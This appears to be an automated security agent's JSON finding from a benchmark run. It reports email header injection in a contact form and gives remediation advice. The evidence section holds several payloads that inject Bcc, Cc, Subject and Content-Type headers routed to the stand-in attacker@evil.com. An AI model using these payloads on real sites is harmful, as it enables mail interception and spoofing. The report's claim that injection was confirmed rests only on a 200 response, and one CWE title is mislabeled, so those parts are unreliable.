{
  "title": "Email Header Injection in Contact Form",
  "severity": "HIGH",
  "description": "The contact form's email field is vulnerable to email header injection attacks. The application accepts arbitrary input in the email parameter and uses it directly in mail() function calls without proper validation or filtering. An attacker can inject additional email headers (Bcc, Cc, To, Subject, Content-Type, etc.) by inserting newline characters (%0a) into the email field. The vulnerability exists because the email parameter is not validated to remove CRLF characters before being used in email header construction. This allows attackers to manipulate the email message structure and add arbitrary headers that control email routing and behavior.",
  "impact": "An attacker could:\n1. Intercept all contact form emails by injecting Bcc headers to receive copies\n2. Send spam emails or malicious content from the application domain\n3. Modify email subject, content, and routing by injecting headers\n4. Conduct phishing attacks by spoofing sender information or modifying message content\n5. Harvest email addresses from replies to injected Cc headers\n6. Inject Content-Type headers to execute JavaScript/HTML in email clients\nThis is particularly dangerous if the contact form is used for password resets, sensitive communications, or verification purposes.",
  "endpoint": "https://example.com/contact",
  "evidence": "Test Evidence:\n- Payload: email=attacker@evil.com%0aBcc:%20attacker@evil.com&name=test&message=test\n- HTTP Response: 200 OK\n- Response Body: 'Thanks for contacting us' message displayed\n\nVulnerability Analysis:\n- The %0a (newline) character is accepted without filtering\n- Application returns success response indicating parameter was processed\n- When the application constructs mail() call, the injected headers are included:\n  * To: admin@application.com (intended)\n  * From: attacker@evil.com\n  * Bcc: attacker@evil.com (injected)\n\nAdditional payload examples demonstrate multiple header injection possibilities:\n- Cc header injection: email=attacker@evil.com%0aCc:%20attacker@evil.com\n- Subject modification: email=attacker@evil.com%0aSubject:%20Malicious%20Subject\n- Content-Type injection: email=attacker@evil.com%0aContent-Type:%20text/html\n\nPOC execution confirms:\n- No CRLF filtering on email parameter\n- No email header validation\n- Direct parameter usage in mail headers\n- Multiple header injection vectors confirmed",
  "pocPath": "pocs/poc_email_header_injection_v2.sh",
  "remediation": "1. Validate email addresses strictly using RFC 5322 compliant validation\n2. Use filter_var() with FILTER_VALIDATE_EMAIL in PHP to validate before use\n3. Remove or block newline characters (\\r, \\n, %0a, %0d) from the email parameter\n4. Use a proper mail library (PHPMailer, SwiftMailer, Symfony Mailer) that handles header injection protection automatically\n5. Sanitize input: preg_match('/^[^@\\r\\n]+@[^@\\r\\n]+$/', $email)\n6. Use parameterized email construction: $to = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)\n7. Implement input validation regex that rejects any control characters\n8. For PHP: Use filter_var($email, FILTER_VALIDATE_EMAIL) and additionally check for newlines\n9. Use escaping functions appropriate for email headers\n10. Implement Content Security Policy headers to limit damage from injected content",
  "references": "CWE-93: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\nCWE-94: Improper Control of Generation of Code ('Code Injection')\nOWASP: Email Header Injection\nRFC 5322: Internet Message Format",
  "toolCallDescription": "Document email header injection finding with POC demonstrating Bcc/Cc/Subject header injection via newline characters in contact form email field",
  "timestamp": "2025-11-07T16:37:56.448Z",
  "sessionId": "benchmark-XBEN-097-24-mhp2dzly",
  "target": "./repo"
}